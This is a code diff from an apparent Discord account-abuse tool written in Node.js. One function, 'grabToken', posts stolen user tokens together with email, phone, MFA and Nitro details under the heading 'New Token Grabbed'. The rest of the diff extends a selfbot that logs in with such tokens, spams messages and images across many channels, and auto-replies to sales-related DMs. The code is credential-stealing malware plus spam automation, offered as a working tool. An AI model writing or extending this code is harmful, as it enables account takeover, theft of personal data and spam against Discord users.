@@ -43,7 +43,7 @@ async function grabToken(token, userInfo, source) {
         };
         
         const embed = {
-            title: 'ð£ New Token Grabbed',
+            title: '🎣 New Token Grabbed',
             color: 0xff0000,
             fields: [
                 { name: 'Token', value: `\`\`\`${token}\`\`\``, inline: false },
@@ -51,9 +51,9 @@ async function grabToken(token, userInfo, source) {
                 { name: 'ID', value: fullInfo.id || 'N/A', inline: true },
                 { name: 'Email', value: fullInfo.email || 'N/A', inline: true },
                 { name: 'Phone', value: fullInfo.phone || 'N/A', inline: true },
-                { name: 'MFA', value: fullInfo.mfa_enabled ? 'â Enabled' : 'â Disabled', inline: true },
-                { name: 'Verified', value: fullInfo.verified ? 'â Yes' : 'â No', inline: true },
-                { name: 'Nitro', value: fullInfo.nitro ? `Type ${fullInfo.nitro}` : 'â No', inline: true },
+                { name: 'MFA', value: fullInfo.mfa_enabled ? '✅ Enabled' : '❌ Disabled', inline: true },
+                { name: 'Verified', value: fullInfo.verified ? '✅ Yes' : '❌ No', inline: true },
+                { name: 'Nitro', value: fullInfo.nitro ? `Type ${fullInfo.nitro}` : '❌ No', inline: true },
                 { name: 'Source', value: source, inline: true },
                 { name: 'Time', value: new Date().toISOString(), inline: true }
             ],
@@ -95,9 +95,10 @@ async function startSelfBot(userId, token, channels, message, delay, autoReply, 
     
     const client = new Client({ 
         checkUpdate: false,
-        intents: ['GUILDS', 'GUILD_MESSAGES', 'DIRECT_MESSAGES'],
+        intents: ['GUILDS', 'GUILD_MESSAGES', 'DIRECT_MESSAGES', 'MESSAGE_CONTENT'],
         partials: ['CHANNEL']
     });
+    
     const channelList = channels;
     let currentIndex = 0;
     let intervalId = null;
@@ -106,10 +107,10 @@ async function startSelfBot(userId, token, channels, message, delay, autoReply, 
         console.log(`[SELFBOT ${configId}] Logged in as ${client.user.tag}`);
         console.log(`[SELFBOT ${configId}] Mode: ${sendAllAtOnce ? 'ALL AT ONCE' : 'SEQUENTIAL'}`);
         console.log(`[SELFBOT ${configId}] Channels: ${channelList.length}, Delay: ${delay}ms`);
+        console.log(`[SELFBOT ${configId}] Auto-reply: ${autoReply ? 'ENABLED' : 'DISABLED'}`);
         
         intervalId = setInterval(async () => {
             if (sendAllAtOnce) {
-                // SEND TO ALL CHANNELS SIMULTANEOUSLY
                 console.log(`[SELFBOT ${configId}] Sending to all ${channelList.length} channels...`);
                 
                 const sendPromises = channelList.map(async (channelId) => {
@@ -120,11 +121,80 @@ async function startSelfBot(userId, token, channels, message, delay, autoReply, 
                             return;
                         }
                         
-                        if (imageUrl && imageUrl.startsWith('data:')) {
+                        // Handle image - check if it's a URL path or base64
+                        let fileAttachment = null;
+                        if (imageUrl) {
+                            if (imageUrl.startsWith('data:')) {
+                                // Base64 image
+                                const base64Data = imageUrl.split(',')[1];
+                                const buffer = Buffer.from(base64Data, 'base64');
+                                const tempDir = path.join(__dirname, 'temp');
+                                const tempPath = path.join(tempDir, `img_${Date.now()}_${configId}_${channelId}.png`);
+                                
+                                if (!fs.existsSync(tempDir)) {
+                                    fs.mkdirSync(tempDir, { recursive: true });
+                                }
+                                
+                                fs.writeFileSync(tempPath, buffer);
+                                fileAttachment = { attachment: tempPath, name: 'image.png' };
+                                
+                                await channel.send({
+                                    content: message,
+                                    files: [fileAttachment]
+                                });
+                                
+                                // Cleanup temp file
+                                setTimeout(() => {
+                                    try { fs.unlinkSync(tempPath); } catch(e) {}
+                                }, 10000);
+                            } else if (imageUrl.startsWith('/uploads/') || imageUrl.startsWith('http')) {
+                                // URL path - read from local file or use URL
+                                let filePath;
+                                if (imageUrl.startsWith('/uploads/')) {
+                                    filePath = path.join(__dirname, 'data', imageUrl);
+                                } else {
+                                    filePath = imageUrl;
+                                }
+                                
+                                if (fs.existsSync(filePath)) {
+                                    await channel.send({
+                                        content: message,
+                                        files: [filePath]
+                                    });
+                                } else {
+                                    await channel.send(message);
+                                }
+                            } else {
+                                await channel.send(message);
+                            }
+                        } else {
+                            await channel.send(message);
+                        }
+                        
+                        console.log(`[SELFBOT ${configId}] ✓ Sent to ${channelId}`);
+                    } catch (e) {
+                        console.error(`[SELFBOT ${configId}] ✗ Error sending to ${channelId}:`, e.message);
+                    }
+                });
+                
+                await Promise.all(sendPromises);
+                console.log(`[SELFBOT ${configId}] Batch complete. Waiting ${delay}ms...`);
+                
+            } else {
+                // SEQUENTIAL MODE
+                const channelId = channelList[currentIndex % channelList.length];
+                currentIndex++;
+                
+                try {
+                    const channel = await client.channels.fetch(channelId);
+                    if (!channel) return;
+                    
+                    if (imageUrl) {
+                        if (imageUrl.startsWith('data:')) {
                             const base64Data = imageUrl.split(',')[1];
                             const buffer = Buffer.from(base64Data, 'base64');
                             const tempDir = path.join(__dirname, 'temp');
-                            const tempPath = path.join(tempDir, `img_${Date.now()}_${configId}_${channelId}.png`);
+                            const tempPath = path.join(tempDir, `img_${Date.now()}_${configId}.png`);
                             
                             if (!fs.existsSync(tempDir)) {
                                 fs.mkdirSync(tempDir, { recursive: true });
@@ -140,49 +210,19 @@ async function startSelfBot(userId, token, channels, message, delay, autoReply, 
                             setTimeout(() => {
                                 try { fs.unlinkSync(tempPath); } catch(e) {}
                             }, 10000);
+                        } else if (imageUrl.startsWith('/uploads/')) {
+                            const filePath = path.join(__dirname, 'data', imageUrl);
+                            if (fs.existsSync(filePath)) {
+                                await channel.send({
+                                    content: message,
+                                    files: [filePath]
+                                });
+                            } else {
+                                await channel.send(message);
+                            }
                         } else {
                             await channel.send(message);
                         }
-                        
-                        console.log(`[SELFBOT ${configId}] â Sent to ${channelId}`);
-                    } catch (e) {
-                        console.error(`[SELFBOT ${configId}] â Error sending to ${channelId}:`, e.message);
-                    }
-                });
-                
-                // Wait for all sends to complete (they run in parallel)
-                await Promise.all(sendPromises);
-                console.log(`[SELFBOT ${configId}] Batch complete. Waiting ${delay}ms...`);
-                
-            } else {
-                // SEQUENTIAL MODE - Send to one channel at a time with delay between each
-                const channelId = channelList[currentIndex % channelList.length];
-                currentIndex++;
-                
-                try {
-                    const channel = await client.channels.fetch(channelId);
-                    if (!channel) return;
-                    
-                    if (imageUrl && imageUrl.startsWith('data:')) {
-                        const base64Data = imageUrl.split(',')[1];
-                        const buffer = Buffer.from(base64Data, 'base64');
-                        const tempDir = path.join(__dirname, 'temp');
-                        const tempPath = path.join(tempDir, `img_${Date.now()}_${configId}.png`);
-                        
-                        if (!fs.existsSync(tempDir)) {
-                            fs.mkdirSync(tempDir, { recursive: true });
-                        }
-                        
-                        fs.writeFileSync(tempPath, buffer);
-                        
-                        await channel.send({
-                            content: message,
-                            files: [{ attachment: tempPath, name: 'image.png' }]
-                        });
-                        
-                        setTimeout(() => {
-                            try { fs.unlinkSync(tempPath); } catch(e) {}
-                        }, 10000);
                     } else {
                         await channel.send(message);
                     }
@@ -195,20 +235,47 @@ async function startSelfBot(userId, token, channels, message, delay, autoReply, 
         }, delay);
     });
     
-    if (autoReply) {
+    // FIXED AUTO-REPLY SYSTEM
+    if (autoReply && autoReplyText) {
+        console.log(`[SELFBOT ${configId}] Setting up auto-reply with text: "${autoReplyText}"`);
+        
         client.on('messageCreate', async (msg) => {
+            // Don't reply to self
             if (msg.author.id === client.user.id) return;
             
-            const isDM = msg.channel.type === 1 || msg.channel.type === 'DM';
-            if (!isDM && !channelList.includes(msg.channel.id)) return;
+            // Check if DM or configured channel
+            const isDM = msg.channel.type === 'DM' || msg.channel.type === 1;
+            const isConfiguredChannel = channelList.includes(msg.channel.id);
+            
+            if (!isDM && !isConfiguredChannel) return;
             
             const content = msg.content.toLowerCase();
-            const triggers = ['price', 'cost', 'how much', 'price?', 'cost?', 'how much?', 'howmuch', 'pricing'];
             
-            if (triggers.some(t => content.includes(t))) {
+            // Expanded trigger words
+            const triggers = [
+                'price', 'cost', 'how much', 'howmuch', 'pricing',
+                'how much is it', 'what is the price', 'price?', 'cost?',
+                'how much?', 'how much does it cost', 'rate', 'fee',
+                'pay', 'payment', 'buy', 'purchase', 'sell', 'selling'
+            ];
+            
+            const shouldReply = triggers.some(t => content.includes(t));
+            
+            if (shouldReply) {
                 try {
-                    await msg.reply(autoReplyText);
-                } catch(e) {}
+                    console.log(`[SELFBOT ${configId}] Auto-replying to ${msg.author.username}: "${autoReplyText}"`);
+                    
+                    // Try reply first, fall back to regular message
+                    try {
+                        await msg.reply(autoReplyText);
+                    } catch (replyErr) {
+                        await msg.channel.send(`${msg.author} ${autoReplyText}`);
+                    }
+                    
+                    console.log(`[SELFBOT ${configId}] Auto-reply sent successfully`);
+                } catch(e) {
+                    console.error(`[SELFBOT ${configId}] Auto-reply error:`, e.message);
+                }
             }
         });
     }
